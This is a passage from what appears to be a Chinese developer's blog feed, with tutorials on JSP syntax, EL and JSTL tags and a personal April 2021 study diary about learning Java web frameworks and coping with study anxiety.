获取其参数，则默认为第一个元素。</p><h4 id="initParam"><a href="#initParam" class="headerlink" title="initParam"></a>initParam</h4><p>获取的参数是 web.xml 中的，<code>&lt;context-param&gt;</code> 标签设置的初始化参数。可以用来获取并初始化使用。</p><h2 id="JSTL-标签库"><a href="#JSTL-标签库" class="headerlink" title="JSTL 标签库"></a>JSTL 标签库</h2><h3 id="JSTL-概述"><a href="#JSTL-概述" class="headerlink" title="JSTL 概述"></a>JSTL 概述</h3><p>JSTL 全称为：JSP Standard Tag Library 是用来加强 JSP 中的代码块 <code>&lt;% %&gt;</code> 而诞生的，目的就是希望在 HTML 中不要出现 Java 的逻辑代码。</p><h3 id="lt-c-set-gt"><a href="#lt-c-set-gt" class="headerlink" title="&lt;c:set&gt;"></a>&lt;c:set&gt;</h3><p>这个 JSTL 标签的写法就是上面这样其中 c 表示 core 为核心库的意思，set 表示标签的类型，为设置类型。此标签的作用是向作用域中保存数据：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set scope=&quot;request&quot; var=&quot;Tempest&quot; value=&quot;Xorex&quot;&gt;&lt;/c:set&gt;</span><br></pre></td></tr></table></figure><p>表示向作用域 request 中写入键值对映射 ：<code>&quot;Tempest&quot;-&gt;&quot;Xorex&quot;</code>。</p><h3 id="lt-c-if-gt"><a href="#lt-c-if-gt" class="headerlink" title="&lt;c:if&gt;"></a>&lt;c:if&gt;</h3><p>用于判断 test 属性中填写的表达式返回的 boolean 值，如果为 true ，那么处理此标签包含的内容，如果为 false，则略过标签包含的内容。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:if test=&quot;$&#123;&#x27;Xorex&#x27;.equals(&#x27;Tempest&#x27;)&#125;&quot;&gt;$&#123;&quot;Xorex is Tempest!&quot;&#125;&lt;/c:if&gt;</span><br><span class="line">$&#123;<span class="string">&quot;Xorex is not Tempest!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt"><a href="#lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt" class="headerlink" title="&lt;c:choose&gt; &lt;c:when&gt; &lt;c:otherwise&gt;"></a>&lt;c:choose&gt; &lt;c:when&gt; &lt;c:otherwise&gt;</h3><p>这个就是为了弥补 <code>&lt;c:if&gt;</code> 里面没有 else 而出现的 switch 语句。最外面必须是 <code>&lt;c:choose&gt;</code> 语句包裹起来，里面则是 <code>&lt;c:when test=&quot;BooleanExpression&quot;&gt;</code> 用来处理 test 为 true 的情况（执行处理包裹代码），如果没有 when 处理的话，则会交给 <code>&lt;c:otherwise&gt;</code> 处理。这里面是没有穿透效应的，被 when 处理之后，就退出 choose 标签里面了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;Xorex.waifu==Yukino&#125;&quot;</span>&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Yukino is my waifu!&quot;</span>&#125;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;Xorex.waifu==Megumi&#125;&quot;</span>&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Megumi is my waifu!&quot;</span>&#125;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:otherwise&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Have not this kind of situation.&quot;</span>&#125;</span><br><span class="line">    &lt;/c:otherwise&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-c-forEach-gt"><a href="#lt-c-forEach-gt" class="headerlink" title="&lt;c:forEach&gt;"></a>&lt;c:forEach&gt;</h3><p>用来遍历，是集合 for 和增强 for 的存在。</p><ul><li>当作普通循环，begin 和 end 设置枚举范围，var 设置枚举对象名：</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach begin=<span class="string">&quot;0&quot;</span> end=<span class="string">&quot;10&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;i&quot;</span>&gt;</span><br><span class="line">   $&#123;i&#125;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><ul><li>当作增强循环，在 itens 中输入实现了迭代器的对象，然后 var 设置单个遍历出来的变量名。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;array&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;waifu&quot;</span>&gt;</span><br><span class="line">   $&#123;waifu&#125; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><ul><li>遍历 Map ，首先用 map 对象的 entrySet() 方法返回一个 EntrySet 对象，然后用增强循环遍历这个 Set，并获取每个 map 里保存的 key 和 value。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;map.entrySet()&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;entry&quot;</span>&gt;</span><br><span class="line">   $&#123;entry.key&#125; $&#123;entry.value&#125; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><p>这里有一个值得说一说的 varStatus 属性，给他设置一个变量名之后，便可以通过这个变量名访问这个对象，它里面记录了本次循环的各种信息，可以供我们参考：</p><p><img src="https://xorex.space/image/212.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EL&quot;&gt;&lt;a href=&quot;#EL&quot; class=&quot;headerlink&quot; title=&quot;EL&quot;&gt;&lt;/a&gt;EL&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;EL 全程为 Expression Language 的意思，是在 JSP 中用来代替表达式 &lt;code&gt;&amp;lt;</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="EL" scheme="https://xorex.space/tags/EL/"/>
    
    <category term="JSTL" scheme="https://xorex.space/tags/JSTL/"/>
    
  </entry>
  
  <entry>
    <title>TodoList:2021-04</title>
    <link href="https://xorex.space/2021/04/01/1d19b4be91dc/"/>
    <id>https://xorex.space/2021/04/01/1d19b4be91dc/</id>
    <published>2021-04-01T13:31:28.000Z</published>
    <updated>2021-04-15T16:50:24.266Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我重新想要写-TodoList-这件事"><a href="#关于我重新想要写-TodoList-这件事" class="headerlink" title="关于我重新想要写 TodoList 这件事"></a>关于我重新想要写 TodoList 这件事</h2><p>三月份的 TodoList 我个人觉得我完成的还算成功，因为除了第六条对于我这种社恐来说实在难以完成，其他五条基本上都已经做到了，无论是学习效率还是学习习惯，都已经进入了一个全新的高度。</p><p>其实现在这个东西现在就已经不是 TodoList 了，因为我发现根本不需要 TodoList 来督促我提高学习的效率，自认为上一个星期中，我的效率已经够高了，高到甚至能达到高三时的 80% 。我相信这是绝大多数大学生都难以到达的高度了（当然肯定比不了双一流的内卷大佬们）。加上上一篇的 TodoList 记录了不到 10 天就鸽了，所以我似乎并没有理由再写一篇 TodoList。</p><p>但是不写总觉得难受，觉得还是要记录下来些什么，学习感悟也好，内心感想也罢，亦或者把这篇博客当成说说分享每天的见闻。所以这次的 4 月份 TodoList 会更加的开放，希望仍然可以被 4 月份温柔以待啊！</p><h2 id="每一天的记录"><a href="#每一天的记录" class="headerlink" title="每一天的记录"></a>每一天的记录</h2><h3 id="04-03"><a href="#04-03" class="headerlink" title="04-03"></a>04-03</h3><p>今天是和往常一样的日子，不过唯一的不同是因为今天是假期，所以变得懒散了起来，上午纵容自己睡了个懒觉（毕竟这一个星期真的是太累了啊），寝室里面比较冷清。下午则是来到了实验室继续肝进度，晚上则是和家里面通了电话，好累啊，明天再努力吧……</p><h3 id="04-05"><a href="#04-05" class="headerlink" title="04-05"></a>04-05</h3><p>今天不太想要去学习，想着一直肝了这么久了（但是还是比不过肝神思达同学），于是就给自己放了一天的假期，当自己尝试去看动画放松的时候，发现根本看不下去，满脑子想的都是自己的项目没做完，停下来放松开始看看项目的时候，又因为假期心里原因看不下去项目，两个都没有办法处理好。</p><p>无法在学习以外的领域进入 <code>心流</code> 状态，已经是我现在最悲哀的事了。</p><p>想想自己好像已经因为焦虑，丧失了获取快乐的能力，正如同知乎里面这个问题的答案一样：<a href="https://www.zhihu.com/question/37672919/answer/224810826">为什么越努力，越焦虑？</a>。我不仅把努力当成手段，也当成了目标。然后强迫自己每天努力，好像不努力学习就是在浪费时间，然后变得更加焦虑。</p><p>所以有什么解决的方法吗，我觉得我现在唯一能做的就是努力忘记未来，仅仅只是活在当下，活在每一天的每一件小事情身上，然后用最高的效率，努力去完成它。未来的事情不用想，想了也没有用，自己只要每天都在享受生活，每天都在全力以赴即可。车至山前必有路，船到桥头自然直，成为一名幸福的普通人就够了！</p><h3 id="04-16"><a href="#04-16" class="headerlink" title="04-16"></a>04-16</h3><p>我果然是个鸽王啊，QAQ 感觉这一晃半个月过去了自己好像啥都每学的样子，真是让人倍感焦虑（又来了）。结束了 Java Web，开始了框架，这大概就是我半个月里面做的事情了吧。</p><p>这几天见证了： Web 项目总结 -&gt; 学习 Spring -&gt; 学习 MyBatis -&gt; 学习 Spring -&gt; 学习 MyBatis -&gt; Web 项目总结，的反复横跳，总算将项目总结写完了，下一步是快速学习 SSM 三大框架，然后做一个项目出来之后，再对三大框架分别进行复盘总结。</p><p>大概是想尝试一条新的学习路线：先快速掌握大概，然后在代码练习中逐渐加深理解，之后通过项目整合，最后复盘总结。更改一下我学一点就总结一点的习惯，我觉得对于一些常用的操作，根本不需要总结，因为用的很多，自然不会忘记，真正需要总结的东西是需要知道，但是理解成本很高，不太常用的东西，在总结的过程中帮助理解和记忆，并留下来复习的副本。</p><p>那些用的多的东西，虽然又多又杂，但是因为有文档很好搜到加上理解成本低，就不需要写博客记录，忘了就再翻阅文档看看并试验一下就记住了。平时学习的时候就要注意多复习多思考，锻炼自己的不断记忆能力啊！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我重新想要写-TodoList-这件事&quot;&gt;&lt;a href=&quot;#关于我重新想要写-TodoList-这件事&quot; class=&quot;headerlink&quot; title=&quot;关于我重新想要写 TodoList 这件事&quot;&gt;&lt;/a&gt;关于我重新想要写 TodoList 这件事&lt;/</summary>
      
    
    
    
    <category term="阶段性总结" scheme="https://xorex.space/categories/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="规划" scheme="https://xorex.space/tags/%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>JSP 页面开发</title>
    <link href="https://xorex.space/2021/03/31/3c183c4054d2/"/>
    <id>https://xorex.space/2021/03/31/3c183c4054d2/</id>
    <published>2021-03-31T13:26:33.000Z</published>
    <updated>2021-04-01T12:52:40.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSP-概述"><a href="#JSP-概述" class="headerlink" title="JSP 概述"></a>JSP 概述</h2><blockquote><p>JSP（全称为 JavaServer Pages）是由 Sun 公司主导建立的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。JSP 技术以 Java 语言作为脚本语言，为用户的 HTTP 请求提供服务，并能与服务器上的其它 Java 程序共同处理复杂的业务需求。</p></blockquote><p>JSP 适合用来处理动态网页的生成，其实本质上还是会翻译成正规的 Servlet 的 Java 程序，只不过 JSP 的技术让我们开发动态网页更加方便了。</p><h2 id="JSP-原理"><a href="#JSP-原理" class="headerlink" title="JSP 原理"></a>JSP 原理</h2><p>JSP 本质上是一个 Servlet 程序，当我们启动 Tomcat 的时候，会将我们写的 JSP 程序翻译成一个完整的 Servlet 程序，在：<code>\JetBrains\IntelliJIdea2020.3\tomcat\d2e3b327-bf64-4ef1-9da7-9edd1aeafdaa\work\Catalina\localhost\BookStore\org\apache\jsp</code> 里面，可以看到 <code>.java</code> 和 <code>.class</code> 文件，这就是被 Tomcat 临时翻译的 Servlet 程序。（因为还没有正式部署到 Tomcat 里面）</p><h2 id="JSP-基本语法"><a href="#JSP-基本语法" class="headerlink" title="JSP 基本语法"></a>JSP 基本语法</h2><h3 id="JSP-表达式"><a href="#JSP-表达式" class="headerlink" title="JSP 表达式"></a>JSP 表达式</h3><p><code>&lt;%= Expression %&gt;</code> 会翻译为 <code>out.print(Expression)</code> 输出。所以表达式不可以带分号，否则会报错。</p><p>比如下面代码使用 JSP 表达式在一级标题标签里面输出时间。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;%= new Date() %&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-脚本"><a href="#JSP-脚本" class="headerlink" title="JSP 脚本"></a>JSP 脚本</h3><p><code>&lt;% Codes; %&gt;</code> 里面的多行代码会被完整的平移到 <code>_jspService()</code> 方法里面，成为方法内部执行代码。因为是完整平移，所以可以作脚本片段拼接，实现循环输出 HTML 代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;&lt;%= new Date() %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-声明"><a href="#JSP-声明" class="headerlink" title="JSP 声明"></a>JSP 声明</h3><p><code>&lt;%! Codes; %&gt;</code> 里面的多行代码会被完整的平移到类里面（非方法），所以里面只可以声明属性和方法（或者静态代码块）。上面的 JSP 脚本就不可以声明这些（因为在 <code>_jspService()</code> 方法内部）只可以执行代码，而 JSP 声明相反。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">toOut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">            System.out.println(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    toOut();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-注释"><a href="#JSP-注释" class="headerlink" title="JSP 注释"></a>JSP 注释</h3><p><code>&lt;%-- JSP 注释 --%&gt;</code> 隐式 JSP 注释，在 Servlet 代码中看不到。</p><p><code>&lt;!-- HTML 注释 --&gt;</code> 显式注释，在客户端可以看到这个 html 注释源码。</p><p><code>&lt;% // /*Java 注释*/ %&gt;</code> 隐式 Java 注释，在 Servlet 代码中看不到。</p><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>各个 JSP 块之间是无法嵌套的，必须独立使用！！！</p><h2 id="jspService-提供对象"><a href="#jspService-提供对象" class="headerlink" title="_jspService() 提供对象"></a>_jspService() 提供对象</h2><p>从生成的 Servlet 代码中可以看到，在 <code>_jspService()</code> 方法中，已经为我们提供了下面的八个实例化好的对象，供我们在 <code>&lt;% %&gt;</code> 代码块中使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">pageContext = _jspxFactory.getPageContext(<span class="keyword">this</span>, request, response,</span><br><span class="line">    <span class="keyword">null</span>, <span class="keyword">true</span>, <span class="number">8192</span>, <span class="keyword">true</span>);</span><br><span class="line">_jspx_page_context = pageContext;</span><br><span class="line">application = pageContext.getServletContext();</span><br><span class="line">config = pageContext.getServletConfig();</span><br><span class="line">session = pageContext.getSession();</span><br><span class="line">out = pageContext.getOut();</span><br><span class="line">_jspx_out = out;</span><br></pre></td></tr></table></figure><h2 id="JSP-指令"><a href="#JSP-指令" class="headerlink" title="JSP 指令"></a>JSP 指令</h2><p>JSP 指令是告诉 Servlet 转化引擎一些信息，类似于配置信息，格式为：<code>&lt;%@ 指令 属性名=&quot;值&quot; %&gt;</code>，属性可以写在一个指令语句中（用空格分开），也可以写在多个指令语句中。</p><h3 id="page-指令"><a href="#page-指令" class="headerlink" title="page 指令"></a>page 指令</h3><blockquote><p>page 指令用于定义 JSP 页面的各种属性，无论 page 指令出现在 JSP 页面中的什么地方，它作用的都是整个 JSP 页面。</p></blockquote><ul><li><p><code>[ language=&quot;java&quot; ]</code> 指明页面的脚本语言，默认为 Java</p></li><li><p><code>[ extends=&quot;package.class&quot; ]</code> 指定生成的 Servlet 程序继承的类，默认为 HttpJspBase，间接继承</p></li><li><p><code>[ import=&quot;&#123;package.class | package.*&#125;, ...&quot; ]</code> 用于导入页面所用的外部类</p></li><li><p><code>[ session=&quot;true | false&quot; ]</code> 指明页面是否使用 session 会话，默认为 true</p></li><li><p><code>[ buffer=&quot;none | 8kb | sizekb&quot; ]</code> 用于设置页面缓冲区，建议使用默认的 8kb</p></li><li><p><code>[ autoFlush=&quot;true | false&quot; ]</code> 设置自动刷新缓冲区默认为 true</p></li><li><p><code>[ isThreadSafe=&quot;true | false&quot; ]</code> 表明页面是否使用了多线程，默认为 true</p></li><li><p><code>[ info=&quot;text&quot; ]</code> 设置一个字符串信息 text，用于描述本页面的信息</p></li><li><p><code>[ errorPage=&quot;relative_url&quot; ]</code> 指定页面出错时跳转页面的位置，设置优先度高于 web.xml</p></li><li><p><code>[ isErrorPage=&quot;true | false&quot; ]</code> 用于标注本页面为错误处理页面，会报错错误信息到 exception 中，默认为 false</p></li><li><p><code>[ contentType=&quot;mimeType [ ;charset=characterSet ]&quot; | &quot;text/html ; charset=ISO-8859-1&quot; ]</code> 指定页面的数据类型，编码等。</p></li><li><p><code>[ pageEncoding=&quot;characterSet | ISO-8859-1&quot; ]</code> 指定数据编码格式</p></li><li><p><code>[ isELIgnored=&quot;true | false&quot; ]</code> 控制 JSP 某些版本的用法是否被忽略</p></li></ul><h3 id="include-指令"><a href="#include-指令" class="headerlink" title="include 指令"></a>include 指令</h3><p>用于引入外部的 jsp 文件，插入到当前的位置，要求两个页面的 page 指令不能冲突。因为引入外部 jsp 页面之后，会将两个文件合在一起，翻译成一个 Servlet 程序。</p><p>head.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;h1 style=&quot;color:red&quot;&gt;这玩意是文件头&lt;/h1&gt;&lt;br&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>foot.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;h1 style=&quot;color:pink&quot;&gt;这玩意是文件尾&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将上面两个文件引入到当前 jsp 文件中:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> errorPage=<span class="string">&quot;Error.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Test for include&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;head.jsp&quot;</span>%&gt;</span><br><span class="line">&lt;h1&gt;俺是文件中间！&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;foot.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JSP-内置对象"><a href="#JSP-内置对象" class="headerlink" title="JSP 内置对象"></a>JSP 内置对象</h2><table><thead><tr><th>NO.</th><th>内置对象</th><th>类型</th></tr></thead><tbody><tr><td>1</td><td>pageContext</td><td>javax.servlet.jsp.PageContext</td></tr><tr><td>2</td><td>request</td><td>javax.servlet.http.HttpServletRequest</td></tr><tr><td>3</td><td>response</td><td>javax.servlet.http.HttpServletResponse</td></tr><tr><td>4</td><td>session</td><td>javax.servlet.http.HttpSession</td></tr><tr><td>5</td><td>application</td><td>javax.servlet.ServletContext</td></tr><tr><td>6</td><td>config</td><td>javax.servlet.ServletConfig</td></tr><tr><td>7</td><td>out</td><td>javax.servlet.jsp.JspWriter</td></tr><tr><td>8</td><td>page</td><td>java.lang.Object</td></tr><tr><td>9</td><td>exception</td><td>java.lang.Throwable</td></tr></tbody></table><h3 id="四大作用域"><a href="#四大作用域" class="headerlink" title="四大作用域"></a>四大作用域</h3><p>pageContext，request，session，application，四种对象的作用域范围测验：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;pageContext&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;One&quot;</span>,<span class="string">&quot;session&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">pageContext 作用域：&lt;%=pageContext.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">request 作用域：&lt;%=request.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">session 作用域：&lt;%=session.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">application 作用域：&lt;%=application.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br></pre></td></tr></table></figure><p>打开上面的页面，发现所有的都有值，说明都在作用域范围内。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：pageContext</span><br><span class="line">request 作用域：request</span><br><span class="line">session 作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>pageContext 作用域限制在当前的页面中，下面添加请求转发，离开当前页面，发现 pageContext 属性值无法读取，已经离开作用域：</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% request.getRequestDispatcher(<span class="string">&quot;/head.jsp&quot;</span>).forward(request, response); %&gt;</span><br></pre></td></tr></table></figure><p>读取结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：request</span><br><span class="line">session 作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>request 作用域限制在一次请求中，当我们直接访问 <code>/head.jsp</code> 发现因为是新的一次请求，而并非设置 request 的请求 + 转发，所以 request 属性值失效。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：null</span><br><span class="line">session 作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>session 作用域是一次会话，会话指从打开网页到关闭浏览器，这一个过程被称为一个会话。当我们访问 <code>test.jsp</code> 之后关闭网页，再次访问 <code>/head.jsp</code> 发现脱离上一次会话之后，session 中属性值失效。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：null</span><br><span class="line">session 作用域：null</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>application 作用域是整个 BookStore 项目，在这个项目下面，所有的页面何时何地都可以获取 application 设置的属性值，只有访问其他 Blog 之类的项目时，才会脱离 application 的作用域。</li></ul><h3 id="out-对象输出"><a href="#out-对象输出" class="headerlink" title="out 对象输出"></a>out 对象输出</h3><p><img src="https://xorex.space/image/209.jpg"></p><p>out 有自己的缓冲区，可以使用 page 命令设置，只有这个缓冲区满了或者 out 调用了 flush() 方法，才会将 out 缓冲区内容交给 Writer 缓冲区处理。</p><p>所以涉及到 out 的缓冲区问题，我们在 JSP 网页中一般都使用 out 来输出而不是 response.getWriter() 来输出。因为 JSP 的网页的 HTML 等都是使用 out 来输出，我们自己乱用 response.getWrite() 来输出会打乱其中的代码顺序。</p><h2 id="JSP-标签"><a href="#JSP-标签" class="headerlink" title="JSP 标签"></a>JSP 标签</h2><p>需要注意一下子的是，下面的东西在填写参数的时候，可以使用 JSP 表达式来填写参数 <code>XXX=&lt;%=Expression%&gt;</code> </p><h3 id="jsp-include"><a href="#jsp-include" class="headerlink" title="jsp:include"></a><a href="jsp:include">jsp:include</a></h3><p>格式： <code>&lt;jsp:include page=&quot;XXX&quot;/&gt;</code> 然后回将对应路径的文件也翻译成 Servlet 程序，然后在本页面使用下面这个函数调用生成的 Servlet 程序，这种包含方式被称为动态包含。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JspRunTimeLibrary.include(request,response,<span class="string">&quot;/XXX/XXX.jsp&quot;</span>,out,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>也就是说，对于动态包含是会生成两个 Servlet 程序，而对于静态包含，则会将两个合并为一个文件，然后生成一个 Servlet 程序。</p><p>因为在调用的时候会传入 request response 参数，所以可以用其请求作用域来传递数据，很方便很好用。当然，一般在开发的时候都会去使用静态包含而不是动态包含。</p><h3 id="jsp-forward"><a href="#jsp-forward" class="headerlink" title="jsp:forward"></a><a href="jsp:forward">jsp:forward</a></h3><p>格式 <code>&lt;jsp:forward page=&quot;XXX/XXX.xxx&quot; &gt;</code> 和 <code>request.getRequestDispatcher(&quot;XXX/XXX.xxx&quot;).forward(request, response);</code> 效果相同。</p><h3 id="jsp-param"><a href="#jsp-param" class="headerlink" title="jsp:param"></a><a href="jsp:param">jsp:param</a></h3><p>格式：<code>&lt;jsp:param name=&quot;ParaName&quot; value=&quot;ParaValue&quot;/&gt;</code> 夹在 <code>&lt;jsp:forward&gt;&lt;/jspforward&gt;</code> 之间，作为转发请求时的附加 Get 参数。其中参数可以是其他的任何引用类型。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JSP-概述&quot;&gt;&lt;a href=&quot;#JSP-概述&quot; class=&quot;headerlink&quot; title=&quot;JSP 概述&quot;&gt;&lt;/a&gt;JSP 概述&lt;/h2&gt;&lt;blockquote&gt;
